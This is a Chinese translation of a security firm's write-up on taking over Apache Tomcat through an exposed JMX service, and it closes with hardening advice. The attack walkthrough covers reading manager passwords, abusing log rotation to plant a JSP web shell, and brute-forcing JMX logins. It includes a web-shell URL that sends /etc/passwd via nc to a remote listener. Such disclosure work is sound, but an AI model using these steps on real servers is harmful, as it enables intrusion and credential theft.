# 【技术分享】通过JMX访问破坏Apache Tomcat

阅读量 **264410**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-02-09 11:44:31

 **x**

##### 译文声明

本文是翻译文章，文章来源：nccgroup.trust

原文地址：<https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/february/compromising-apache-tomcat-via-jmx-access/>

译文仅供参考，具体内容表达以及含义原文为准。

****

翻译：[ **myswsun**](http://bobao.360.cn/member/contribute?uid=2775084127)

预估稿费：300RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿

**0x00 前言**

本文主要关注Tomcat服务器的一些配置问题，可以将Java管理扩展（JMX）服务暴露到外部网络中，来用于远程监视和管理的目的。

通过使用Java开发工具包（JDK）中的JConsole工具，这些功能可能被攻击者滥用来获得系统的控制权限。

本文的编写是为了来强调这种之前不为作者所知的新的攻击方式，它与Tomcat服务器暴露的JMX接口有关。

希望在这里提供了足够的信息，以利于提出阻止这种利用的有效的缓解措施并且帮助渗透测试团队评估使用这种配置的Tomcat服务器的状态。

本文讨论的这个问题已经提交给Tomcat团队，被分类为程序的已知功能，并且目前没有任何补丁提供。

总而言之，Tomcat指出：

Java JMX访问相当于admin/root访问，其处理方式与对具有admin / root权限的机器的物理访问相同。

其他敏感的信息，比如session IDs，可通过JMX访问，并且隐藏这些信息将严重降低JMX接口的实用性。

Tomcat文档通常不涵盖JMX的主题，但是在其他地方会涵盖它。

任何读者在阅读本文后都应该遵循第九节中的建议。

  

**0x01 Tomcat的JMX服务**

Apache Tomcat的JMX服务通常被用来通过网络监控和管理远程Tomcat

实例，通过Java远程方法调用（RMI）来与服务器交互。

这个服务默认不开启，与之相反的是其他常见的Java企业版的服务器（比如JBoss）是默认配置开启的。

为了开启Tomcat的JMX服务，需要在setenv.sh/setenv.bat做一些简单的修改，这个脚本是用来设置环境变量和Catalina进程启动时的一些属性。

JMX服务可以配置为支持认证，但是它默认不开启。当认证被开启（总是被推荐），它的授权模型允许访问属于只读或读写角色的两个不同的用户。

网络上关于JMX接口的配置信息很少且过时了。

例如，在下面的URL对应的网页的标题为“监视和管理Tomcat”，但是它的配置指导是基于java 6版本的：

<http://tomcat.apache.org/tomcat-8.0-doc/monitoring.html#Enabling_JMX_Remote>

这个指南的第一段开始有一段注释：

“注释：这个配置只在你需要远程监控Tomcat时才开启，如果只是本地监视则不需要开启，且需要使用启动Tomcat相同的用户。”

这个快速指南包括认证未开启的简单配置。然后它建议需要认证时，修改配置来启用上述的两个角色且分配密码。

指南中有意思的一个片段如下：

如果你需要认证，添加并修改这个：

    
    
    -Dcom.sun.management.jmxremote.authenticate=true
    -Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password
    -Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access

编辑$CATALINA_BASE/conf/jmxremote.access文件：

    
    
    monitorRole readonly
    controlRole readwrite

编辑$CATALINA_BASE/conf/jmxremote.password文件：

    
    
    monitorRole tomcat
    controlRole tomcat

提示：密码文件应该是只读的，只能用和运行Tomcat相同的操作系统用户来访问。

如上所见，jmxremote.access文件包含两个用户名（monitorRole和controlRole）和他们相关的角色。在jmxremote.password文件中设置这些用户的密码。

对此服务始终建议启用认证，但快速指南不强调此功能。

这个指南不强调为只读和读写用户设置强密码的重要性。这就是为什么在现场渗透测试期间，这个接口经常被发现没有配置认证或者使用了与指南建议类似的弱密码。

  

**0x02 决定是否启用Tomcat的JMX接口**

通常需要使用nmap进行扫描，来确认与Tomcat关联的JMX接口是否已启动并在远程服务器上运行。

在这种情况下强烈建议使用–version-all和-A标志，因为它会告诉nmap触发附加探测器来检测非标准端口上JMX接口的存在。

例如，假设使用以下命令行扫描Tomcat服务器：

    
    
    >nmap -p- -sV -A 192.168.11.128 -n
    Nmap scan report for 192.168.11.128
    Host is up (0.00028s latency).
    Not shown: 65521 closed ports
    PORT STATE SERVICE VERSION
    ...
    2001/tcp open dc?
    ...
    8009/tcp open ajp13 Apache Jserv (Protocol v1.3)
    |_ajp-methods: Failed to get a valid response for the OPTION request
    8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1
    |_http-favicon: Apache Tomcat
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-server-header: Apache-Coyote/1.1
    |_http-title: Apache Tomcat/8.0.39
    ...
    49222/tcp open unknown

为了简单起见，上面的扫描结果仅包括与Tomcat相关的端口。可以看到，端口2001/tcp和端口49222/tcp未明确标识。

然而，添加–version-all标志将显示更多有趣的信息：

    
    
    >nmap -p- -A -sV --version-all 192.168.11.128
    Nmap scan report for 192.168.11.128
    Host is up (0.00032s latency).
    Not shown: 65521 closed ports
    PORT STATE SERVICE VERSION
    ...
    2001/tcp open java-rmi Java RMI Registry
    | rmi-dumpregistry:
    | jmxrmi
    | implements javax.management.remote.rmi.RMIServer,
    | extends
    | java.lang.reflect.Proxy
    | fields
    | Ljava/lang/reflect/InvocationHandler; h
    | java.rmi.server.RemoteObjectInvocationHandler
    | @192.168.11.128:2001
    | extends
    |_ java.rmi.server.RemoteObject
    ...
    8009/tcp open ajp13 Apache Jserv (Protocol v1.3)
    |_ajp-methods: Failed to get a valid response for the OPTION request
    8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1
    |_http-favicon: Apache Tomcat
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-server-header: Apache-Coyote/1.1
    |_http-title: Apache Tomcat/8.0.39
    ...
    49222/tcp open rmiregistry Java RMI

在这种情况下，JMX服务被配置为在非标准端口2001/tcp而不是端口1099/tcp上运行，1099/tcp通常被这种服务的优先选择。

此外，应当注意的是当JMX接口运行时，运行Java RMI的随机端口也可用于Tomcat。从客户端/攻击者角度来看，能够连接此端口也很重要。

也就是说，单独使用nmap无法确定Tomcat JMX接口是否启用认证。

  

**0x03 使用JConsole连接JMX服务**

如果你使用Windows，JConsole是JDK中的一个小的可执行文件，存储在bin文件夹中。启动后主界面如下图：

图1 – Jconsole主界面

JConsole也在Linux版的JDK中提供，且在Kali中找到如下图：

图2 – Kali中的JConsole

如果逆向远程连接到Tomcat JMX接口，选择Remote Process选项且输入目标的IP地址加端口号。点击Connect按钮：

图3 – 设置目标

JConsole能够检测到SSL是否开启，并且显示如下提示：

图4 – 目标中的SSL没有开启

单击Insecure connection按钮继续。当启用认证，通常会显示以下提示：

图5 – 认证启动的提示

在这种情况下，您应该使用username和password文本框输入一些有效的凭据。请注意，也可能由于其他原因获得连接失败错误。

连接失败的常见原因之一是由于攻击者和服务器之间的防火墙。此防火墙可能配置为阻止传入流量到由Tomcat启动的其他Java
RMI进程使用的端口（例如，上面nmap扫描输出中列出的49222/tcp）。

使用您喜欢的网络嗅探器进行流量捕获，以了解“连接失败”错误是否与认证相关。

在下面的示例中，Tomcat JMX服务器（运行于192.168.11.128）正在返回包含认证失败错误的RMI消息：

图6 – 认证失败-暗示需要认证凭据

请注意，上面的错误包括需要凭据的字符串，表示在JConsole初始屏幕中未指定任何凭据。

在输入一些凭据时返回不同的错误消息：

图7 – 不可靠的用户名和密码

如果未启用认证（这在某些内部网络渗透测试中可能是正确的），显示如下：

图8 – Jconsole连接到远程的Tomcat JMX接口

事情开始变的有趣。

从这一点开始，我们将考虑攻击者能够识别一个监听的Tomcat
JMX接口并可以使用JConsole连接到它的情况。这是可能的，因为认证未启用，或者因为攻击者能够猜到一些有效的凭据。

  

**0x04 使用JMX读取Tomcat管理器的密码**

假设Tomcat启用了管理器应用程序，但是没有使用任何弱凭据（如admin/admin或tomcat/manager）。假设攻击者试图使用自动脚本来强制一个有效的密码而不成功。

在这里，可能得出没有方法发现管理器密码的结论。

事实上，有一个简单的方法，在忽略密码强度的情况下恢复密码，在写文章的这一刻，这个技术还没有参考。

这个方法是在你的机器上面启动JConsole并且指向远程的Tomcat JMX服务器。选择MBeans选项卡：

图9 – 选择MBeans

之后显示如下：

图10 – Mbeans

展开Users目录，且选择下面的节点：

    
    
    Users->User->”manager”->UserDatabase->Attributes

你应该能够看见类似下面的一些东西，这些暗示了凭据：

图11 – 泄漏的Tomcat管理器的用户名和密码

在这里，你能使用发现的凭据来连接到远程Tomcat管理器，以控制服务器。

  

**0x05 日志循环函数中的目录遍历**

如果你已经看到了这里，你已经有了一个好且简单的方法来访问Tomcat管理器，来破环底层服务器。

执行此操作的典型方法是部署简单的Web应用程序存档（WAR），包括允许执行操作系统（OS）命令的代码，然后调查服务器上的内容。

如果服务器在Windows上运行，则大多数时间它将作为SYSTEM或管理员运行。因此，你的操作系统命令将在最高权限级别运行。

但是，如果由于某些原因Tomcat管理器不在那里怎么办？

虽然在内部网络中部署的服务器则不可能是这种情况，但是仍然有可能，因此我们需要另一种方法来浏览服务器，假设我们仍然能够连接Tomcat JMX接口。

**日志循环函数**

在大量的具有写权限的Tomcat JMX
MBeans操作中，有一个显示了有趣的行为。当JMX服务没有配置支持认证时，这个特别的功能也能访问。下面是它的Java特征：

    
    
    boolean rotate(string newFileName)

上面的特征在下面的节点提供：

    
    
    Catalina->Valve->localhost->AccessLogValve->Operations

这表明rotate函数用于备份Tomcat访问日志到服务器上的文件中。

为了证明这个，下载了运行Tomcat8.0.39的Bitnami Linux
VM。然后配置服务器来公开JMX端口，以便允许使用JConsole进行连接。最后totate函数用此位置指定文件：

    
    
    /tmp/test.log

完成这个过程后，下面的确认消息由服务器返回：

图12 – ‘True’确认消息被执行

可以确认test.log文件在tmp目录中。直到rotate函数被调用，目录的内容是Tomcat访问日志。

    
    
    bitnami@ubuntu:/tmp$ cat /tmp/test.log
    192.168.11.1 - - [08/Dec/2016:14:50:42 +0000] "GET /test-log-request HTTP/1.1" 404 1026
    bitnami@ubuntu:/tmp$

**在服务器上面执行OS命令**

正如上一节讨论的，rotate函数允许在服务器的任意目录中存储文件。它还将允许选择该文件的任意扩展。

这意味着，作为一个攻击者，我们滥用它来在Tomcat提供网络服务的目录中创建一个Java Servlet
Page（JSP）文件。在这里我们的目标创建包含JSP指令的文件来在服务器上面执行命令。

为了实现这个，我们首先需要的是使用在URL中包含有效的JSP代码的请求来破环Tomcat访问日志。

例如，使用Burp Suite Repeater来发送下面的请求。注意在这个例子中，我们测试的Tomcat运行在80/tcp端口：

图13 – 发送的请求

现在我们需要的是找到一个可靠的路径来存放我们的使用rotate函数的JSP文件。关于这个我们能利用JConsole界面中的一些信息。

VM的Summary选项卡能提供一些关于catalina.base属性的信息。这个选项卡包含一个节（在窗口底部），显示了Java VM的参数。

例子显示如下：

图14 – catalina.base文件夹

Catalina.base目录应该返回一个webapps文件夹，其中是Tomcat提供的各种网络服务。

部署在服务器上的网络应用可以在MBeans选项卡中看到。

下面的截图是Tomcat服务器默认的应用的例子：

图15 – Tomcat上默认的应用

将cataline.base目录的信息和Tomcat上的应用列表放在一起，找到存储我们JSP文件的目录还是可能的。

例如，一个test.jsp文件存储在/docs文件夹中：

    
    
    /opt/bitnami/apache-tomcat/webapps/docs/test.jsp

在这里，上面的路径可以和rotate函数一起使用：

图16 – test.jsp文件被创建

我们能打开浏览器并运行一个命令。在下面的截图中一个命令被执行，用来把/etc/passwd的内容粘帖到nc客户端中，继而连接一个远程监听器：

图17 – 远程服务器上面的数据

作为参考，执行命令的URL显示如下：

    
    
    http://192.168.11.141/docs/test.jsp?cmd=sh%20-c%20$@|sh%20.%20echo%20/bin/cat%20/etc/passwd%20|%20nc%20192.168.11.136%208080

这包括一些调整，允许使用管道将输出从一个命令重定向到另一个命令。

如果需要，目前为止的web shell也可以用来执行wget命令，并从远程机器上面下载一个更多功能的JSP shell。

**捕获SMB challenge-responses hashes**

正如已经讨论的，如果你的Tomcat服务器在Windows上面运行，意味着通过JSP shell执行的命令和通过rotate函数创建的命令将以最高权限运行。

然而，有时可能出现不正确的情况，且服务器运行在域账户。如果那种情况，捕获SMB challenge-responses和破解他们是可能的。Rotate函数也在这里使用。

为了测试攻击场景，Kali虚拟机可以用来启动Metasploit SMB capture auxiliary module。

使用JConsole执行JMX连接，并且使用下面的参数使用rotate函数：

    
    
    \192.168.11.136test

在这种情况，上面的IP地址是Kali虚拟机。下面的截图确认了Tomcat向远程IP发送了一个请求，能够3次捕获SMB challenge：

图18 – 捕获的SMB challenge response

**通过创建其他文件类型来进行client-side攻击**

注意，rotate函数也能用来创建敏感文件（如HTML文件），并且在网络应用中存储他们，以便执行跨站脚本攻击。

这个涉及到，重复上述步骤，使用可靠的HTML代码污染日志文件，然后在Tomcat网络应用程序目录中存储一个HTML文件。

图19 – html文件

  

**0x06 抓取网络应用的用户的session ID**

另外的Tomcat JMX操作能被攻击者利用来劫持Tomcat网络应用的用户的会话，lisrSessionIds()在下面的节点显示：

    
    
    Catalina->Manager->[ApplicationName]->Operations->listSessionIds()

这个操作通常可用于Tomcat上部署的每个网络应用中，且如名称所示，能返回连接应用的用户的所有的JSESSIONID。

例如，下面的截图显示了连接管理器应用的用户的session ID：

通过Tomcat JMX服务可用的操作之一将允许检索JSESSIONID cookie值，因此可能允许攻击者通过劫持他们的会话来假冒另一个用户。

注意，由于需要该帐户的有效用户名和密码，因此无法利用此问题访问管理器应用程序。然而，部署在服务器上的其他应用程序（例如支持基于JSESSIONID
cookie的认证的应用程序）会受到影响。

能够运行listSessionIds()数的攻击者将能够劫持另一个用户的会话。

注意，listSessionIds()是另一个操作，它只对具有写入权限的JMX用户可用。

如果JMX服务器配置为允许未经认证的访问，那么它仍然可以使用。

  

**0x07 暴力破解进入Tomcat JMX**

当Tomcat JMX服务配置为启用认证并且使用强密码时，仍有可能获得未经授权的访问。

实际上，为此服务实现的认证过程在登录失败后不会锁定帐户，因此容易受到暴力密码破解攻击。

PoC工具（jmxbf）已经由作者开发来演示这个。

使用例子如下：

    
    
    $>Usage: 
    java -jar jmxbf.jar
    -h,--host <arg> The JMX server IP address.
     -p,--port <arg> The JMX server listening port.
     -pf,--passwords-file <arg> File including the passwords, one per line.
     -uf,--usernames-file <arg> File including the usernames, one per line.

Example:

    
    
    $>java –jar jmxbf.jar –h 192.168.20.1 –p 1099 –uf usernames.txt –pf passwords.txt

一些例子输出如下：

    
    
    $>java –jar jmxbf.jar –h 192.168.20.1 –p 1099 –uf usernames.txt –pf passwords.txt
    Auth failed!!!
    Auth failed!!!
    Auth failed!!!
    . . .
    Auth failed!!!
    Auth failed!!!
    ###SUCCESS### - We got a valid connection for: control:supersecretpwd
    Found some valid credentials - continuing brute force
    ....
    ###SUCCESS### - We got a valid connection for: monitor:monitor
    Found some valid credentials - continuing brute force
    Auth failed!!!
    Auth failed!!!
    Auth failed!!!
    Auth failed!!!
    . . .
    Auth failed!!!
    Auth failed!!!
    Auth failed!!!
    The following valid credentials were found:
    control:supersecretpwd
    monitor:monitor

这个工具通过github可以下载到：<https://github.com/nccgroup/jmxbf> 。

  

**0x08 其他问题？**

正如已经提到的，MBeans操作的大列表和属性能提供给连接Tomcat
JMX服务的用户使用。可能还有其他函数，可以使用与上面讨论的rotate函数问题所示的类似的方式。

深入研究才能确定。

如果由于强大的认证措施让你无法访问Tomcat JMX控制台，则仍然有潜在的方法来破坏服务器。

Tomcat最近修补了两个与Java反序列化相关的漏洞，如果暴露了JMX服务器，可以利用这些漏洞：

<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3427>

<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8735>

本文不讨论这些漏洞的细节，但是却可以说如果你的Tomcat运行在老版本的Java系统中，是可能通过发送特定的包到JMX服务器来实现RCE。

进一步研究后再发布新文。

  

**0x09 建议**

有很多可以实现的建议，来保护有本文讨论的问题的Tomcat服务器。

首先，建议对JMX服务的访问使用防火墙。只有列入白名单的IP地址才能连接。

然而，应该始终启用强密码的认证。下面是在Windows使用setenv.bat启动认证的例子：

    
    
    SET JAVA_HOME={replace with full path to Java JDK}
    SET JRE_HOME=%JAVA_HOME%
    SET JAVA_OPTS=%JAVA_OPTS% -Xms256m -Xmx512m -XX:MaxPermSize=256m -server
    SET CATALINA_OPTS=-Dcom.sun.management.jmxremote 
    -Dcom.sun.management.jmxremote.port=1099 
    -Dcom.sun.management.jmxremote.rmi.port=1099 
    -Dcom.sun.management.jmxremote.ssl=true 
    -Dcom.sun.management.jmxremote.local.only=false 
    -Djava.rmi.server.hostname={replace with Tomcat server IP address}
    SET CATALINA_OPTS=%CATALINA_OPTS% 
    -Dcom.sun.management.jmxremote.authenticate=true 
    -Dcom.sun.management.jmxremote.password.file=%CATALINA_BASE%/conf/jmxremote.password 
    -Dcom.sun.management.jmxremote.access.file=%CATALINA_BASE%/conf/jmxremote.access

下面是Linux下面使用setenv.sh的例子：

    
    
    JAVA_HOME={replace with full path to Java JDK}
    JRE_HOME=$JAVA_HOME
    JAVA_OPTS="-Djava.awt.headless=true -XX:+UseG1GC -Dfile.encoding=UTF-8 $JAVA_OPTS "
    JAVA_OPTS="-XX:MaxPermSize=256M -Xms256M -Xmx512M $JAVA_OPTS " 
    CATALINA_OPTS="-Dcom.sun.management.jmxremote 
    -Dcom.sun.management.jmxremote.port=1099 
    -Dcom.sun.management.jmxremote.rmi.port=1099 
    -Dcom.sun.management.jmxremote.ssl=true 
    -Dcom.sun.management.jmxremote.local.only=false 
    -Djava.rmi.server.hostname={replace with Tomcat server IP address} 
    -Dcom.sun.management.jmxremote.authenticate=true 
    -Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password 
    -Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access" 
    export JAVA_HOME
    export JRE_HOME
    export JAVA_OPTS
    export CATALINA_OPTS

SSL也应该开启，以保护认证过程中凭据嗅探攻击。

注意，在上述所有的配置中，jmxremote.ssl变量设为true。

然而，没有包括正确启用SSL其他的一些变量。需要的其他配置步骤在这里不再详述。

下面的URL包含了这个任务的参考信息：

<https://db.apache.org/derby/docs/10.10/adminguide/radminjmxenablepwdssl.html>

<https://www.ibm.com/support/knowledgecenter/SSYMRC_6.0.1/com.ibm.jazz.repository.web.admin.doc/topics/t_server_mon_tomcat_option3.html>

强烈推荐为只读和读写用户在jmxremote.password文件中设置高强度密码保护。这些应该与Tomcat管理器不同。

并且，考虑为所有用户选择不常用的用户名。

另外，只有Tomcat用户才被允许读取jmxremote.password文件。如果检测到这个文件的读权限太宽松，Tomcat将不会启动。

下面的命令能被用来在Windows上面设置这些权限：

    
    
    cacls jmxremote.password /P [username]:R

尽管JMX访问等同于admin/root访问，如果一个人能够以只读用户身份访问JMX服务，那么仍然可能看到Tomcat管理器用户名和密码。

的确，只读用户将不被允许运行任何JMX操作，但他们仍然能够访问一个敏感的信息，在大多数情况下，将导致Tomcat服务器的破环。

关于rotate函数的问题，作者认为应该严格的控制，以避免Tomcat JMX服务器在服务器上可用的任何文件夹上创建具有任何扩展名的日志文件。

通过这个函数创建的日志文件只能在Tomcat日志文件夹中创建，并且无法使用URL访问。

最后，考虑在系统上存储一个哈希版本的Tomcat管理器密码（因为这个哈希将在JMX属性中可见）而不是纯文本版本。

注意，这是我们从Tomcat收到的一个建议，同时讨论了JMX只读用户能够读取管理器的密码的问题。然而，这种情况下如果用户名还是明文，攻击者可以使用离线密码破解工具破解密码。

下面的URL包含了存储哈希版本密码的一些参考：

<https://tomcat.apache.org/tomcat-8.0-doc/realm-howto.html#Digested_Passwords>

<http://www.jdev.it/encrypting-passwords-in-tomcat/>

<https://leanjavaengineering.wordpress.com/2011/02/04/tomcat-digested-passwords/>

下面是digest工具的使用例子：

    
    
    digest.bat -s 0 -i 1 themanagersecretpassword

将输出明文和加密的凭据：

    
    
    themanagersecretpassword:42052cec2459a6b4c383f2c43698d0528fe3f39756f8524763fc9e2997e77ebf1f1ba9bc0926b7395e32bb796e4ec0c1045e96c15c1edb510c2e295a5c11b095

注意，在上面的例子中，-s和-i参数分别用于设置salt的长度和迭代次数。

Digest工具还接受-a参数，来指定哈希算法。

根据Tomcat的推荐，当不使用-a参数，则默认使用SHA-512。

另外，应该注意不带-s和-i参数使用digest，将返回{salt}${iterations}${digest}格式的输出，例子如下：

    
    
    >digest.bat themanagersecretpassword
    themanagersecretpassword:92cd45d5db0f5794c794bf4fb0cc975347978d53673ec3c946a28c199c209995$1$a27648ca5671b33692ebb95a80720903dfd50b13da649b1d703ffc0260b2194ddec21616528bf4f6a99fb6b8fa724c6c518c2c45125b135b82c2ec16b060cb2f

上述的例子，关于salt的长度（字节）和迭代次数，使用默认值，

虽然作者写作是不知道，但是下面的工具在2014年由Jeremy
Mousset创建，覆盖了本文讨论的一部分内容，且不涉及JConsole：https://github.com/jmxploit/jmxploit

本文翻译自nccgroup.trust [原文链接](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/february/compromising-apache-tomcat-via-jmx-access/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **root** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/85442](/post/id/85442)

安全客 - 有思想的安全新媒体

本文转载自: [nccgroup.trust](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/february/compromising-apache-tomcat-via-jmx-access/)

如若转载,请注明出处： <https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/february/compromising-apache-tomcat-via-jmx-access/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __2赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) root

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

